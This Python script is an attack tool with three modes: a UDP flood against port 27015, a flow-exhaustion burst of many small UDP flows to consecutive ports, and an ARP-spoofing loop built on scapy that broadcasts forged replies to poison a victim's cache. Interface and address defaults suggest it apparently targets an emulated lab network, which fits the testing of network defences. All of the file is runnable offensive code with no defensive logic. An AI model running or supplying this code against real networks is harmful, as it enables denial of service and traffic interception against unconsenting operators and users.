import argparse, socket, random, time, sys

def udp_flood(target, rate_mbps, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
    pkt = random.randbytes(1400)
    end = time.time() + duration
    while time.time() < end:
        try:
            sock.sendto(pkt, (target, 27015))
        except Exception:
            pass

def flow_exhaust(target, n_flows, duration):
    end = time.time() + duration
    for i in range(n_flows):
        if time.time() >= end:
            break
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(b"x", (target, 30000 + i))
        sock.close()
        time.sleep(0.01)

def arp_spoof(target_ip, victim_ip, iface, duration):
    from scapy.all import sendp, ARP, Ether, conf
    forged_mac = "de:ad:be:ef:ca:fe"
    end = time.time() + duration
    conf.iface = iface
    while time.time() < end:
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=forged_mac) / \
              ARP(op=2, hwsrc=forged_mac, psrc=target_ip,
                  hwdst="ff:ff:ff:ff:ff:ff", pdst=victim_ip)
        sendp(pkt, iface=iface, verbose=False, count=5)
        time.sleep(0.025)

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--attack", choices=["udp_flood","flow_exhaust","arp_spoof"], required=True)
    ap.add_argument("--target", required=True)
    ap.add_argument("--victim", default="10.0.1.1")
    ap.add_argument("--rate", type=int, default=50)
    ap.add_argument("--flows", type=int, default=1500)
    ap.add_argument("--duration", type=int, default=40)
    ap.add_argument("--iface", default="atk-eth0")
    args = ap.parse_args()
    if args.attack == "udp_flood":
        udp_flood(args.target, args.rate, args.duration)
    elif args.attack == "flow_exhaust":
        flow_exhaust(args.target, args.flows, args.duration)
    elif args.attack == "arp_spoof":
        arp_spoof(args.target, args.victim, args.iface, args.duration)
